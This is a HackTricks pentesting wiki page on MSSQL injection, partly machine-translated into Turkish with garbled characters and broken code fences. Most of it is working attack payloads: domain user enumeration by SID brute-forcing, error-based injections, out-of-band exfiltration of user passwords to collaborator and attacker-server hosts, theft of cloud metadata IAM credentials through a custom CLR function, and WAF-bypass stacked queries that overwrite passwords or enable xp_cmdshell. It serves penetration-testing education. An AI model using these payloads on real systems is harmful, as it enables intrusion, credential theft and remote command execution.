# MSSQL Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Active Directory enumeration

**MSSQL** sunucusu iÃ§inde SQL injection aracÄ±lÄ±ÄŸÄ±yla **alan kullanÄ±cÄ±larÄ±nÄ± listelemek** mÃ¼mkÃ¼n olabilir, aÅŸaÄŸÄ±daki MSSQL fonksiyonlarÄ±nÄ± kullanarak:

* **`SELECT DEFAULT_DOMAIN()`**: Mevcut alan adÄ±nÄ± alÄ±r.
* **`master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))`**: Alan adÄ±nÄ±n adÄ±nÄ± biliyorsanÄ±z (_DOMAIN_ bu Ã¶rnekte) bu fonksiyon **Administrator kullanÄ±cÄ±sÄ±nÄ±n SID'sini** hex formatÄ±nda dÃ¶ndÃ¼recektir. Bu, `0x01050000000[...]0000f401` gibi gÃ¶rÃ¼necektir, **son 4 byte'Ä±n** **500** sayÄ±sÄ± olduÄŸunu not edin, bu da **administrator kullanÄ±cÄ±sÄ±nÄ±n ortak ID'sidir**.\
Bu fonksiyon, **alanÄ±n ID'sini bilmenizi** saÄŸlayacaktÄ±r (son 4 byte hariÃ§ tÃ¼m byte'lar).
* **`SUSER_SNAME(0x01050000000[...]0000e803)`** : Bu fonksiyon, belirtilen **ID'nin kullanÄ±cÄ± adÄ±nÄ±** dÃ¶ndÃ¼recektir (varsa), bu durumda **0000e803** big endian == **1000** (genellikle bu, oluÅŸturulan ilk normal kullanÄ±cÄ± ID'sidir). O zaman 1000'den 2000'e kadar kullanÄ±cÄ± ID'lerini brute-force yapabileceÄŸinizi ve muhtemelen alan kullanÄ±cÄ±larÄ±nÄ±n tÃ¼m kullanÄ±cÄ± adlarÄ±nÄ± alabileceÄŸinizi hayal edebilirsiniz. Ã–rneÄŸin, aÅŸaÄŸÄ±daki gibi bir fonksiyon kullanarak:
```python
def get_sid(n):
domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
user = struct.pack('<I', int(n))
user = user.hex()
return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```
## **Alternatif Hata TabanlÄ± VektÃ¶rler**

Hata tabanlÄ± SQL enjeksiyonlarÄ± genellikle `+AND+1=@@version--` gibi yapÄ±larÄ± ve Â«ORÂ» operatÃ¶rÃ¼ne dayanan varyantlarÄ± andÄ±rÄ±r. Bu tÃ¼r ifadeleri iÃ§eren sorgular genellikle WAF'lar tarafÄ±ndan engellenir. Bir geÃ§iÅŸ olarak, aranan verilerde bir veri tÃ¼rÃ¼ dÃ¶nÃ¼ÅŸÃ¼m hatasÄ± tetikleyen belirli fonksiyon Ã§aÄŸrÄ±larÄ±nÄ±n sonuÃ§larÄ±yla %2b karakterini kullanarak bir dize birleÅŸtirin.

Bu tÃ¼r fonksiyonlardan bazÄ± Ã¶rnekler:

* `SUSER_NAME()`
* `USER_NAME()`
* `PERMISSIONS()`
* `DB_NAME()`
* `FILE_NAME()`
* `TYPE_NAME()`
* `COL_NAME()`

Fonksiyon `USER_NAME()` kullanÄ±mÄ±na Ã¶rnek:
```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```
![](https://swarm.ptsecurity.com/wp-content/uploads/2020/11/6.png)

## SSRF

Bu SSRF numaralarÄ± [buradan alÄ±ndÄ±](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

### `fn_xe_file_target_read_file`

Sunucuda **`VIEW SERVER STATE`** izni gerektirir.
```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```
### `fn_get_audit_file`

**`CONTROL SERVER`** izni gerektirir.
```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```
### `fn_trace_gettabe`

**`CONTROL SERVER`** izni gerektirir.
```
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='CONTROL SERVER';
# Or doing
Use master;
EXEC sp_helprotect 'fn_trace_gettabe';
```
### `xp_dirtree`, `xp_fileexists`, `xp_subdirs` <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a>

Microsoft tarafÄ±ndan resmi olarak belgelenmemiÅŸ olmasÄ±na raÄŸmen, `xp_dirtree` gibi saklÄ± yordamlar, MSSQL iÃ§indeki aÄŸ iÅŸlemlerindeki faydalarÄ± nedeniyle Ã§evrimiÃ§i olarak baÅŸkalarÄ± tarafÄ±ndan tanÄ±mlanmÄ±ÅŸtÄ±r. Bu yordamlar genellikle, Ã§eÅŸitli [Ã¶rneklerde](https://www.notsosecure.com/oob-exploitation-cheatsheet/) ve [paylaÅŸÄ±mlarda](https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/) sergilendiÄŸi gibi, Band DÄ±ÅŸÄ± Veri sÄ±zdÄ±rma iÅŸlemlerinde kullanÄ±lÄ±r.

Ã–rneÄŸin, `xp_dirtree` saklÄ± yordamÄ±, aÄŸ istekleri yapmak iÃ§in kullanÄ±lÄ±r, ancak yalnÄ±zca TCP port 445 ile sÄ±nÄ±rlÄ±dÄ±r. Port numarasÄ± deÄŸiÅŸtirilemez, ancak aÄŸ paylaÅŸÄ±mlarÄ±ndan okuma yapmaya izin verir. KullanÄ±mÄ± aÅŸaÄŸÄ±daki SQL betiÄŸinde gÃ¶sterilmektedir:
```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\' + @user + '.attacker-server\\aa"');
```
Bu yÃ¶ntemin, varsayÄ±lan ayarlarla Ã§alÄ±ÅŸan `Windows Server 2016 Datacenter` Ã¼zerindeki `Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)` gibi tÃ¼m sistem yapÄ±landÄ±rmalarÄ±nda Ã§alÄ±ÅŸmayabileceÄŸi dikkate deÄŸerdir.

AyrÄ±ca, benzer sonuÃ§lar elde edebilecek `master..xp_fileexist` ve `xp_subdirs` gibi alternatif saklÄ± prosedÃ¼rler de bulunmaktadÄ±r. `xp_fileexist` hakkÄ±nda daha fazla bilgiye bu [TechNet makalesinden](https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx) ulaÅŸabilirsiniz.


### `xp_cmdshell` <a href="#master-xp-cmdshell" id="master-xp-cmdshell"></a>

AÃ§Ä±kÃ§a, bir **SSRF** tetikleyen bir ÅŸeyi **Ã§alÄ±ÅŸtÄ±rmak** iÃ§in **`xp_cmdshell`** de kullanabilirsiniz. Daha fazla bilgi iÃ§in sayfadaki **ilgili bÃ¶lÃ¼mÃ¼ okuyun**:

{% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
[pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
{% endcontent-ref %}

### MSSQL KullanÄ±cÄ± TanÄ±mlÄ± Fonksiyonu - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

Ã–zel iÅŸlevleri Ã§alÄ±ÅŸtÄ±rmak iÃ§in MSSQL iÃ§inde yÃ¼klenmek Ã¼zere herhangi bir .NET dilinde yazÄ±lmÄ±ÅŸ ve DLL'ye derlenmiÅŸ bir CLR UDF (Common Language Runtime KullanÄ±cÄ± TanÄ±mlÄ± Fonksiyonu) oluÅŸturmak, `dbo` eriÅŸimi gerektiren bir sÃ¼reÃ§tir. Bu, genellikle veritabanÄ± baÄŸlantÄ±sÄ±nÄ±n `sa` olarak veya bir YÃ¶netici rolÃ¼ ile yapÄ±lmasÄ± durumunda mÃ¼mkÃ¼ndÃ¼r.

Binary'nin MSSQL'e CLR derlemesi olarak yÃ¼klenmesini kolaylaÅŸtÄ±rmak iÃ§in [bu Github deposunda](https://github.com/infiniteloopltd/SQLHttp) bir Visual Studio projesi ve kurulum talimatlarÄ± saÄŸlanmÄ±ÅŸtÄ±r; bÃ¶ylece MSSQL iÃ§inden HTTP GET isteklerinin Ã§alÄ±ÅŸtÄ±rÄ±lmasÄ± saÄŸlanmaktadÄ±r.

Bu iÅŸlevselliÄŸin temeli, bir GET isteÄŸi gerÃ§ekleÅŸtirmek ve iÃ§eriÄŸi almak iÃ§in `WebClient` sÄ±nÄ±fÄ±nÄ± kullanan `http.cs` dosyasÄ±nda kapsÃ¼llenmiÅŸtir; aÅŸaÄŸÄ±da gÃ¶sterildiÄŸi gibi:
```csharp
using System.Data.SqlTypes;
using System.Net;

public partial class UserDefinedFunctions
{
[Microsoft.SqlServer.Server.SqlFunction]
public static SqlString http(SqlString url)
{
var wc = new WebClient();
var html = wc.DownloadString(url.Value);
return new SqlString(html);
}
}
```
`CREATE ASSEMBLY` SQL komutunu Ã§alÄ±ÅŸtÄ±rmadan Ã¶nce, derlemenin SHA512 hash'ini sunucunun gÃ¼venilir derlemeler listesine eklemek iÃ§in aÅŸaÄŸÄ±daki SQL kodunu Ã§alÄ±ÅŸtÄ±rmanÄ±z Ã¶nerilir (gÃ¶rÃ¼ntÃ¼lemek iÃ§in `select * from sys.trusted_assemblies;`):
```sql
EXEC sp_add_trusted_assembly 0x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937,N'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil';
```
BaÅŸarÄ±yla assembly ekledikten ve fonksiyonu oluÅŸturduktan sonra, HTTP istekleri gerÃ§ekleÅŸtirmek iÃ§in aÅŸaÄŸÄ±daki SQL kodu kullanÄ±labilir:
```sql
DECLARE @url varchar(max);
SET @url = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/';
SELECT dbo.http(@url);
```
### **HÄ±zlÄ± SÃ¶mÃ¼rÃ¼: Tek Sorguda TÃ¼m Tablo Ä°Ã§eriklerini Alma**

[Buradan hile](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

Tek bir sorguda bir tablonun tam iÃ§eriÄŸini Ã§Ä±karmak iÃ§in kullanÄ±lan Ã¶zlÃ¼ bir yÃ¶ntem, `FOR JSON` ifadesini kullanmaktÄ±r. Bu yaklaÅŸÄ±m, "ham" gibi belirli bir mod gerektiren `FOR XML` ifadesine gÃ¶re daha kÄ±sadÄ±r. KÄ±salÄ±ÄŸÄ± nedeniyle `FOR JSON` ifadesi tercih edilmektedir.

Ä°ÅŸte mevcut veritabanÄ±ndan ÅŸemayÄ±, tablolarÄ± ve sÃ¼tunlarÄ± nasÄ±l alacaÄŸÄ±nÄ±z:
```sql
https://vuln.app/getItem?id=-1'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
In situations where error-based vectors are used, it's crucial to provide an alias or a name. This is because the output of expressions, if not provided with either, cannot be formatted as JSON. Here's an example of how this is done:

```sql
```markdown
https://vuln.app/getItem?id=1'+and+1=(select+concat_ws(0x3a,table_schema,table_name,column_name)a+from+information_schema.columns+for+json+auto)--
```
```

### Retrieving the Current Query

[Trick from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/).

For users granted the `VIEW SERVER STATE` permission on the server, it's possible to see all executing sessions on the SQL Server instance. However, without this permission, users can only view their current session. The currently executing SQL query can be retrieved by accessing sys.dm_exec_requests and sys.dm_exec_sql_text:

```sql
```markdown
https://vuln.app/getItem?id=-1%20union%20select%20null,(select+text+from+sys.dm_exec_requests+cross+apply+sys.dm_exec_sql_text(sql_handle)),null,null
```
```

To check if you have the VIEW SERVER STATE permission, the following query can be used:

```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='VIEW SERVER STATE';
```

## **Little tricks for WAF bypasses**

[Tricks also from here](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)

Non-standard whitespace characters: %C2%85 Ğ¸Ğ»Ğ¸ %C2%A0:

```
```markdown
https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
```
```

Scientific (0e) and hex (0x) notation for obfuscating UNION:

```
https://vuln.app/getItem?id=0eunion+select+null,@@version,null--

https://vuln.app/getItem?id=0xunion+select+null,@@version,null--
```

A period instead of a whitespace between FROM and a column name:

```
https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
```

\N separator between SELECT and a throwaway column:

```
```markdown
https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
```
```

### WAF Bypass with unorthodox stacked queries

According to [**this blog post**](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/) it's possible to stack queries in MSSQL without using ";":

```sql
SELECT 'a' SELECT 'b'
```

So for example, multiple queries such as:

```sql
use [tempdb]  
create table [test] ([id] int)  
insert [test] values(1)  
select [id] from [test]  
drop table[test]
```

Can be reduced to:

```sql
use[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
```

Therefore it could be possible to bypass different WAFs that doesn't consider this form of stacking queries. For example:

```
# Gereksiz bir exec() ekleyerek WAF'Ä±n bunun geÃ§erli bir sorgu olmadÄ±ÄŸÄ±nÄ± dÃ¼ÅŸÃ¼nmesini saÄŸlamak
admina'union select 1,'admin','testtest123'exec('select 1')--
## Bu ÅŸÃ¶yle olacak:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# Garip bir ÅŸekilde oluÅŸturulmuÅŸ sorgular kullanmak
admin'exec('update[users]set[password]=''a''')--
## Bu ÅŸÃ¶yle olacak:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# Ya da xp_cmdshell'i etkinleÅŸtirmek
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
## Bu ÅŸÃ¶yle olacak
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

## References

* [https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/](https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/)
* [https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/](https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
